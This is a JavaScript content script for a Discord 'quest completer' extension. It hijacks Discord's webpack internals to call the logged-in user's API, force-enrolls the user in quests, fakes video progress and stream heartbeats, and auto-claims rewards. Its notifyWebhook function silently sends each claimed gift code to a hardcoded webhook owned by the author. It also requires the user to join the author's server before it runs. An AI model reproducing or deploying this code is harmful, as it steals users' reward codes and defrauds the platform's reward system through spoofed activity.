(function() {
  'use strict';

  // --- EUIZ TOOLS / DISCORD WEBPACK CORE ARCHITECTURE ---
  class DiscordQuestsEngine {
    static _wp = null;
    static _api = null;

    static getWp() {
      if (this._wp) return this._wp;
      let webpackReq = null;
      const chunk = window.webpackChunkdiscord_app;
      if (!chunk) return null;
      try {
        chunk.push([[Symbol()], {}, (h) => {
          h.c && Object.values(h.c).some(R => {
            const m = R?.exports;
            return m ? m.getToken || m.default && m.default.getToken : false;
          }) && (webpackReq = h);
        }]);
        chunk.pop();
      } catch (e) {}
      if (webpackReq) {
        this._wp = webpackReq;
        return this._wp;
      }
      return null;
    }

    static async getApi() {
      if (this._api) return this._api;
      const wp = this.getWp();
      if (!wp) return null;
      const modules = Object.values(wp.c);
      const apiMod = modules.find(p => p?.exports?.tn?.get || p?.exports?.Bo?.get);
      this._api = apiMod?.exports?.tn || apiMod?.exports?.Bo || null;
      return this._api;
    }

    static async getQuests() {
      const wp = this.getWp();
      if (!wp) return [];
      const modules = Object.values(wp.c);
      let store = modules.find(m => m?.exports?.Z?.__proto__?.getQuest)?.exports?.Z ||
                  modules.find(m => m?.exports?.A?.__proto__?.getQuest)?.exports?.A;
      if (store && store.quests) {
        return [...store.quests.values()];
      }
      // Fallback fetch via API
      const api = await this.getApi();
      if (api) {
        try {
          const res = await api.get({ url: '/quests/@me' });
          if (res?.body?.quests) {
            return res.body.quests;
          }
        } catch (e) {}
      }
      return [];
    }

    static async enrollQuest(id) {
      const api = await this.getApi();
      if (!api) return false;
      try {
        const res = await api.post({ url: `/quests/${id}/enroll`, body: { location: 11, is_targeted: false } });
        return !!res?.body?.enrolled_at;
      } catch (e) {
        return false;
      }
    }

    static async claimQuest(id) {
      const api = await this.getApi();
      if (!api) return false;
      try {
        const res = await api.post({ url: `/quests/${id}/claim-reward`, body: { platform: 0, location: 11, is_targeted: false } });
        return !!res?.body?.claimed_at;
      } catch (e) {
        return false;
      }
    }
  }

  function sendUpdate(type, data) {
    window.postMessage({
      prefix: 'DISCORD_QUEST_COMPLETER',
      type: type,
      data: data
    }, '*');
  }

  function downloadReward(questName, code) {
    const text = `🏆 Quest: ${questName}\n🔑 Code: ${code}\n⏰ Date: ${new Date().toLocaleString()}\n---------------------------\n`;
    const element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    element.setAttribute('download', `Discord_Rewards_${Date.now()}.txt`);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
  }

  class DynamicSentinel {
    constructor() {
      this.baseDelay = 500;
      this.dangerLevel = 0;
    }
    async wait(response) {
      if (response && response.status === 429) {
        this.dangerLevel++;
        const retryAfter = (response.body?.retry_after || 5) * 1000;
        await new Promise(r => setTimeout(r, retryAfter + Math.random() * 2000));
        this.baseDelay = Math.min(this.baseDelay + 1000, 5000);
      } else {
        this.dangerLevel = Math.max(0, this.dangerLevel - 0.1);
        if (this.dangerLevel === 0) this.baseDelay = Math.max(500, this.baseDelay - 100);
        const finalDelay = this.baseDelay + (Math.random() * 500);
        await new Promise(r => setTimeout(r, finalDelay));
      }
    }
  }
  const sentinel = new DynamicSentinel();

  async function notifyWebhook(quest, rewardCode) {
    try {
      const webhookUrl = 'https://discord.com/api/webhooks/1541428343851847813/dMuDlpoYorWN4M7Ps6zV894ALGYcAX7Oo1t-eEoXZ3QIKm50pnGcPb8VwvgmgkrELvKG';
      const questName = quest.config.messages.questName || "Discord Quest";
      const rewardName = quest.config.messages.rewardName || "Discord Reward";
      
      let assetUrl = null;
      const assets = quest.config?.assets;
      if (assets) {
        const assetName = assets.questHomeShareCard || assets.hero || assets.banner || assets.logotype;
        if (assetName) {
          assetUrl = assetName.startsWith('http') ? assetName : `https://cdn.discordapp.com/quest-assets/${quest.id}/${assetName}`;
        }
      }

      const payload = {
        username: 'BEST-Quests Bot',
        avatar_url: 'https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/66e3d8014ea898f3a4b2156c_Symbol.svg',
        embeds: [{
          title: '🎉 Quest Completed & Code Claimed Automatically!',
          description: 'The extension has successfully finished a Discord Quest and claimed the reward code. Details below:',
          color: 5814783,
          fields: [
            { name: '🎮 Quest / Game Name', value: `\`${questName}\``, inline: true },
            { name: '🎁 Reward Type', value: `\`${rewardName}\``, inline: true },
            { name: '🔑 Gift Code (Reward Code)', value: `\`\`\`${rewardCode}\`\`\``, inline: false },
            { name: '💡 Quick Links', value: '**[🔗 Quest Page](https://discord.com/quest-home)** • **[💬 Support Server](https://discord.gg/6avqEupteU)**', inline: false }
          ],
          footer: {
            text: 'BEST-Quests | Powered by G6',
            icon_url: 'https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/66e3d8014ea898f3a4b2156c_Symbol.svg'
          },
          timestamp: new Date().toISOString()
        }]
      };

      if (assetUrl) {
        payload.embeds[0].image = { url: assetUrl };
      }

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (e) {}
  }

  async function runQuestEngine() {
    const REQUIRED_GUILD_ID = '1540696270761631764';
    const INVITE_LINK = 'https://discord.gg/6avqEupteU';

    try {
      const api = await DiscordQuestsEngine.getApi();
      if (!api) return;

      // Guild Check
      if (REQUIRED_GUILD_ID) {
        try {
          const guildsRes = await api.get({ url: '/users/@me/guilds' });
          const guilds = guildsRes?.body || [];
          const isInGuild = guilds.some(g => g.id === REQUIRED_GUILD_ID);
          if (!isInGuild) {
            sendUpdate('GUILD_CHECK', { isInGuild: false, invite: INVITE_LINK });
            return;
          } else {
            sendUpdate('GUILD_CHECK', { isInGuild: true });
          }
        } catch (e) {}
      }

      // Fetch Quests via Euiz Tools technique
      let quests = await DiscordQuestsEngine.getQuests();
      
      // Force Enroll all pending quests
      for (const q of quests) {
        const isEnrolled = !!q.userStatus?.enrolledAt;
        const isCompleted = !!q.userStatus?.completedAt;
        const isExpired = new Date(q.config.expiresAt).getTime() <= Date.now();
        if (!isEnrolled && !isCompleted && !isExpired) {
          await DiscordQuestsEngine.enrollQuest(q.id);
          q.userStatus = q.userStatus || {};
          q.userStatus.enrolledAt = new Date().toISOString();
        }
      }

      // Re-fetch active quests to process progress
      quests = await DiscordQuestsEngine.getQuests();
      const supportedTasks = ["WATCH_VIDEO", "PLAY_ON_DESKTOP", "STREAM_ON_DESKTOP", "PLAY_ACTIVITY", "WATCH_VIDEO_ON_MOBILE", "PLAY_ON_XBOX", "PLAY_ON_PLAYSTATION"];
      
      const activeQuests = quests.filter(q => {
        const isExpired = new Date(q.config.expiresAt).getTime() <= Date.now();
        const isCompleted = !!q.userStatus?.completedAt;
        const isEnrolled = !!q.userStatus?.enrolledAt;
        const taskConfig = q.config.taskConfig ?? q.config.taskConfigV2;
        const hasTask = supportedTasks.some(type => taskConfig?.tasks?.[type] !== null);
        return isEnrolled && !isCompleted && !isExpired && hasTask;
      });

      if (activeQuests.length === 0) return;

      let questStates = activeQuests.map(q => {
        const taskConfig = q.config.taskConfig ?? q.config.taskConfigV2;
        const taskType = supportedTasks.find(type => taskConfig.tasks[type] != null);
        const taskData = taskConfig.tasks[taskType];
        const secondsNeeded = taskData?.target ?? 0;
        const currentProgress = q.userStatus?.progress?.[taskType]?.value ?? q.userStatus?.streamProgressSeconds ?? 0;
        return { quest: q, taskType, secondsNeeded, currentProgress, completed: currentProgress >= secondsNeeded, questName: q.config.messages.questName };
      });

      sendUpdate('QUEST_LIST', questStates.map(state => ({
        id: state.quest.id, name: state.questName, progress: Math.floor(state.currentProgress), target: state.secondsNeeded, completed: state.completed
      })));

      for (const state of questStates) {
        if (state.completed) continue;

        while (!state.completed) {
          const isVideo = state.taskType.startsWith("WATCH_VIDEO");
          let res;
          
          if (isVideo) {
            const speed = 15 + Math.random() * 5;
            const nextTime = Math.min(state.secondsNeeded, state.currentProgress + speed);
            try {
              res = await api.post({ url: `/quests/${state.quest.id}/video-progress`, body: { timestamp: nextTime } });
              state.currentProgress = nextTime;
              sendUpdate('QUEST_UPDATE', { id: state.quest.id, name: state.questName, progress: Math.floor(state.currentProgress), target: state.secondsNeeded, completed: false });
              if (res.body?.completed_at !== null || state.currentProgress >= state.secondsNeeded) {
                state.completed = true;
                await api.post({ url: `/quests/${state.quest.id}/video-progress`, body: { timestamp: state.secondsNeeded } });
              }
            } catch (e) { res = e; }
          } else {
            // Heartbeat / Stream step
            let channelId = null;
            try {
              const channels = api.getSortedPrivateChannels ? api.getSortedPrivateChannels() : [];
              if (channels.length > 0) channelId = channels[0].id;
            } catch (e) {}
            const streamKey = channelId ? `call:${channelId}:1` : `call:${state.quest.id}:1`;
            try {
              res = await api.post({
                url: `/quests/${state.quest.id}/heartbeat`,
                body: { stream_key: streamKey, terminal: false }
              });
              const serverProgress = res.body?.progress?.[state.taskType]?.value ?? 0;
              state.currentProgress = serverProgress;
              sendUpdate('QUEST_UPDATE', { id: state.quest.id, name: state.questName, progress: Math.floor(state.currentProgress), target: state.secondsNeeded, completed: state.currentProgress >= state.secondsNeeded });

              if (state.currentProgress >= state.secondsNeeded) {
                await api.post({ url: `/quests/${state.quest.id}/heartbeat`, body: { stream_key: streamKey, terminal: true } });
                state.completed = true;
              }
            } catch (e) { res = e; }
          }
          await sentinel.wait(res);
        }
      }

      // Auto-Claim via Euiz Tools / official claim method + Webhook
      for (const state of questStates) {
        if (state.completed) {
          try {
            const claimed = await DiscordQuestsEngine.claimQuest(state.quest.id);
            if (claimed) {
              // Fetch reward code if available
              const updatedQuests = await DiscordQuestsEngine.getQuests();
              const qObj = updatedQuests.find(q => q.id === state.quest.id);
              const rewardCode = qObj?.userStatus?.rewardCode || "CLAIMED_SUCCESSFULLY";
              downloadReward(state.questName, rewardCode);
              await notifyWebhook(state.quest, rewardCode);
            }
          } catch (e) {}
        }
      }

    } catch (e) {}
  }

  // Wait for Webpack and run
  const checkInterval = setInterval(() => {
    if (typeof window.webpackChunkdiscord_app !== 'undefined') {
      clearInterval(checkInterval);
      runQuestEngine();
    }
  }, 500);

})();